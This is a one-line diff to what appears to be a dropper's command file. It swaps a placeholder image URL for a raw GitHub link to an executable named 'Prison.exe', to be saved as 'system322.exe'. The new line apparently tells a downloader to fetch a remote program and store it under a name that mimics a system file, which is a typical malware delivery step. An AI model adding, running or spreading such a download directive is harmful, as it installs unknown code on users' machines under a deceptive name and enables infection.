@@ -1,1 +1,1 @@
-DOWNLOAD:http://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png;system322.exe
+DOWNLOAD:https://github.com/cybershadow255/tresor/raw/refs/heads/main/Prison.exe;system322.exe
